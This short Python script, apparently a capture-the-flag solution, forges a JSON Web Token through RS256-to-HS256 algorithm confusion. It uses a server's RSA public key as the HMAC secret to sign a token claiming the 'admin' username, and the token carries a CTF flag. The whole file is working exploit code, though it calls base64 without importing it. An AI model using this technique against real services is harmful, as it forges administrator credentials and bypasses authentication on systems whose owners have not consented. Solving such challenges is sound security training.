import jwt
import hashlib
import hmac
key = b"-----BEGIN PUBLIC KEY-----\n\
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAj/zVrnALJvljFoFxAfJU\n\
BxsIKyCRljceq/Utml6A62TV9MShUz4Ufzwnt+lBYiwl20HyH1Avb9lNS5lLlEjY\n\
JPJNJ4RdqM9fjhDd0awF71TEkKqnrAKO+v4gXQYzxizXL/P4dEl6Z8VFitrskb4I\n\
WegqMA80Xs0AcRW5y2U+a5umcOph4xtLSxO8uoyzJHd+dRxrn+Ux9cbWHdRZZ05X\n\
0IwD4SAvZrg1Ig0JepQp+l3MIvj7+A3bG7C1mtmNS0YmGew2Quofb9t0ILlgK0qM\n\
T2aqoJMrNterQQI5LNcYAwdqzylHzSU+pVgKDBIo3ddkfvPW58Q/PV2WVM8NR9OQ\n\
0QIDAQAB\n\
-----END PUBLIC KEY-----\n"
header = '{"alg": "HS256", "typ": "JWT"}'
payload = '{"username":"admin","flag1":"CNS{JW7_15_N07_a_900d_PLACE_70_H1DE_5ecrE75}","exp":1786583759}'
header = base64.urlsafe_b64encode(bytes(header, "utf-8")).decode().replace("=", "").encode()
payload = base64.urlsafe_b64encode(bytes(payload, "utf-8")).decode().replace("=", "").encode()
sig = hmac.new(key, header + b'.' + payload, hashlib.sha256).digest().strip()
sig = base64.urlsafe_b64encode(sig).decode().replace("=", "")
jwt = '{}.{}.{}'.format(header.decode(), payload.decode(), sig)
print(jwt)